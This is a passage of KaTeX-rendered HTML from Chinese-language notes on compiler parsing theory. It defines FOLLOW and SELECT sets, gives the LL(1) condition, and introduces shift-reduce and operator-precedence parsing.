fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">{</mo><mi>α</mi><mi mathvariant=\"normal\">∣</mi><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mo>…</mo><mi>A</mi><mi>α</mi><mo>⋯</mo><mo>∧</mo><mi>α</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">FOLLOW\\left(A\\right)=\\left\\{\\alpha|S\\stackrel{*}{\\Rightarrow}\\dots A\\alpha\\dots \\land \\alpha \\in V_{T}\\right\\}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.80002em;vertical-align:-0.65002em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size2\">{</span></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size2\">}</span></span></span></span></span></span></span></p>\n<p>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mo>…</mo><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">S\\stackrel{*}{\\Rightarrow}\\dots A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>，规定<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">$</mi><mo>∈</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mrow><mo fence=\"true\">(</mo><mi>A</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">\\$ \\in FOLLOW\\left(A\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.80556em;vertical-align:-0.05556em;\"></span><span class=\"mord\">$</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</p>\n<h5 id=\"select集合\"><a class=\"markdownIt-Anchor\" href=\"#select集合\"></a> SELECT集合</h5>\n<p>对于文法中任意一条规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，定义<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi></mrow><annotation encoding=\"application/x-tex\">SELECT</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span></span></span></span>集合。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi><mrow><mo fence=\"true\">(</mo><mi>A</mi><mo>→</mo><mi>α</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">{</mo><mtable rowspacing=\"0.3599999999999999em\" columnalign=\"left left\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mrow><mo fence=\"true\">(</mo><mi>α</mi><mo fence=\"true\">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mtext>if </mtext><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi>α</mi><menclose notation=\"updiagonalstrike\"><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover></menclose><mi>ϵ</mi></mstyle></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mrow><mo fence=\"true\">(</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy=\"false\">(</mo><mi>α</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mrow><mo fence=\"true\">{</mo><mi>ϵ</mi><mo fence=\"true\">}</mo></mrow><mo fence=\"true\">)</mo></mrow><mo>∪</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mrow><mo fence=\"true\">(</mo><mi>A</mi><mo fence=\"true\">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mtext>if </mtext><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi>α</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>ϵ</mi></mstyle></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding=\"application/x-tex\">SELECT\\left(A\\rightarrow \\alpha\\right)=\n\n\\begin{cases}\n\nFIRST\\left(\\alpha\\right)&amp;\\text{if $\\alpha \\cancel{\\stackrel{*}{\\Rightarrow}} \\epsilon$}\\\\\n\n\\left(FIRST(\\alpha)-\\left\\{\\epsilon\\right\\}\\right)\\cup FOLLOW\\left(A\\right)&amp;\\text{if $\\alpha {\\stackrel{*}{\\Rightarrow}} \\epsilon$}\n\n\\end{cases}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.0000299999999998em;vertical-align:-1.25003em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size4\">{</span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.69em;\"><span style=\"top:-3.69em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.19em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.69em;\"><span style=\"top:-3.69em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord\">if </span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord cancel-lap\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord cancel-pad\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span style=\"height:0.992566em;\"><svg width='100%' height='0.992566em'><line x1='0' y1='100%' x2='100%' y2='0' stroke-width='0.046em'/></svg></span></span></span></span></span></span><span class=\"mord mathdefault\">ϵ</span></span></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord\">if </span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\">ϵ</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.19em;\"><span></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<h4 id=\"ll1文法的条件\"><a class=\"markdownIt-Anchor\" href=\"#ll1文法的条件\"></a> LL(1)文法的条件</h4>\n<p>当且仅当，文法中对每个非终结符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>的任意两个不同的规则，其<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi></mrow><annotation encoding=\"application/x-tex\">SELECT</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span></span></span></span>集合不<strong>相交</strong>。对于LL(1)文法，可以用自上而下的递归方法进行分析，且不存在回溯和死循环。</p>\n<h3 id=\"自下而上分析法\"><a class=\"markdownIt-Anchor\" href=\"#自下而上分析法\"></a> 自下而上分析法</h3>\n<p>基本思想与方法：“移进-规约“，将输入串中的字符从左到右push到stack中，一边移进一边分析。<strong>当栈顶符号形成某挑规则右部时</strong>，进行一次<strong>规约</strong>，将相应的右部符号串替换成规则左部的非终结符。重复这个过程，直到输入串都被push到stack中，且stack中只剩下<strong>右界符</strong><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">$</mi></mrow><annotation encoding=\"application/x-tex\">\\$</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.80556em;vertical-align:-0.05556em;\"></span><span class=\"mord\">$</span></span></span></span>和文法的开始符号，则匹配成功。</p>\n<p>从语法树的角度去看，自下而上的方法是<strong>从叶结点开始的</strong>。</p>\n<h4 id=\"算符优先分析法\"><a class=\"markdownIt-Anchor\" href=\"#算符优先分析法\"></a> 算符优先分析法</h4>\n<p>算符优先分析法简单、直观，但对文法有较高的要求。</p>\n<h5 id=\"算符文法\"><a class=\"markdownIt-Anchor\" href=\"#算符文法\"></a> 算符文法</h5>\n<p>设有文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>，若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>中不出现形如<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>U</mi><mo>→</mo><mo>…</mo><mi>V</mi><mi>W</mi><mo>…</mo></mrow><annotation encoding=\"application/x-tex\">U\\rightarrow \\dots VW \\dots</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">U</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span></span></span></span>，其中<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>V</mi></mrow><annotation encoding=\"application/x-tex\">V</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span></span></span></span>是非终结字符，则称<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是<strong>算符文法</strong>。</p>\n<p>在算符文法中，任何一个规则右部都不存在两个相邻的非终结字符。它有两个性质：</p>\n<ol>\n<li>在算符文法中任何句型都不含两个相邻的非终结字符。</li>\n<li>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">Ab</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\">b</span></span></span></span>或者<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">bA</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mord mathdefault\">A</span></span></span></span>出现在算符文法的句型<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>中，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>是非终结字符，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>是终结字符，则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>中任何包含<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>的短语必定包含<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>。</li>\n</ol>\n<blockquote>\n<p>回溯学习：</p>\n<p>假设<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>δ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\delta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span></span></span></span>是文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的一个句型，如果有</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>α</mi><mi>A</mi><mi>δ</mi><mo>∧</mo><mi>A</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">S{\\stackrel{*}{\\Rightarrow}}\\alpha A \\delta \\land A {\\stackrel{+}{\\Rightarrow}} \\beta\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.269641em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\"><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span 